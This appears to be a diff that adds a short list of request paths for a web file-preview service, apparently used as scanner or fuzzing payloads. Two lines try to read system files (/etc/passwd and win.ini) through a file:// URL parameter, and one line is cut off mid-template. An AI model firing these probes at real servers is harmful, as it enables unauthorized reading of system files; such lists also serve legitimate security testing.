@@ -1,0 +1,4 @@
+/getCorsFile?urlPath=file:///etc/passwd
+/getCorsFile?urlPath=file:///c://windows/win.ini
+/getCorsFile?urlPath={{base64(
+/onlinePreview?url={{base64(https://example.com)}}
